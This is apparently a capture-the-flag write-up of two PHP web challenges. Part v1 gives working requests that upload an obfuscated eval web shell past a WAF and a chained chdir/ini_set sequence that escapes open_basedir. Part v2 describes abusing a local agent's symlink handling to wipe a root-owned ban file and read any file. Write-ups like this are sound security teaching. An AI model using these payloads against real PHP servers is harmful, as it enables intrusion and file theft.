cloud computing v1
==================

First, we upload a php shell. We need to bypass the PHP waf, so we use the unicode character trick:

```
>>> print requests.get("http://pwnable.org:47780/", params={"action": "upload", "data": '<?=eval(${~"\xa0\xb8\xba\xab"}[1]);'}).text

>>> print requests.get("http://pwnable.org:47780/", params={"action": "shell", "1": "echo 1;"}).text
1

>>> print requests.get("http://pwnable.org:47780/", params={"action": "shell", "1": 'var_dump(scandir("sandbox/805fb7200ba4a2dea98877874d1db5185e6c5e2a/"));'}).text
array(3) {
  [0]=>
  string(1) "."
  [1]=>
  string(2) ".."
  [2]=>
  string(9) "index.php"
}
```

There is a lot of disable_functions restictions.

We notice we have a `open_basedir` restriction, so we try some of the basedir bypasses found online. The one that ends up working is [https://twitter.com/eboda_/status/1113839230608797696](https://twitter.com/eboda_/status/1113839230608797696)

```
chdir("sandbox/8ddd028c8f68d41d6d562447956a5905e68665c2/");var_dump(mkdir("test"));

chdir("sandbox/8ddd028c8f68d41d6d562447956a5905e68665c2/");var_dump(chdir("test"));
ini_set("open_basedir", "..");
chdir("..");chdir("..");chdir("..");chdir("..");chdir("..");chdir("..");chdir("..");
ini_set("open_basedir", "/");var_dump(scandir("/"));
```

We have to run all the commands in a single request. This bypasses the basedir.

We can download a image flag in `/flag.img` and extract a PNG from it using binwalk which contains the flag.

There is also a interesting binary at `/agent` which will be useful later.


cloud computing v2
==================

We can use the same shell from the previous challenge but the open_basedir bypass doesn't work since we don't have chdir.
However we can use `file_get_contents` to check localhost/ and notice there is a custom webserver running. This probably is the same as
the `/agent` binary we found earlier.

We reverse the binary and notice that there are three interesting endpoints. init,read,scan.

init takes a directory parameter and creates a config.json with a contents: `{"ban": "flag"}`.

read takes a directory parameter and a target param. It reads the config.json from the directory and checks for the characters in the ban property,
so in our case the target file cannot have any f,l,a,g characters. If it passes, then we have a file read, we can confirm this by reading `/etc/hosts`.

scan takes a directory, goes through all the php files in that directory, and empties them.


The first thing we tried was to create a subdirectory in our sandbox dir and create a empty config.json in that, however the server checks that the config.json
file has to be owned by root, so this doesn't work.

The next thing we did was created a directory with a php file that is a symlink to config.json. So when we run scan on this directory, it actually goes to the config.json
and empties it. So now that there is no ban, we can use the read endpoint to read the flag.
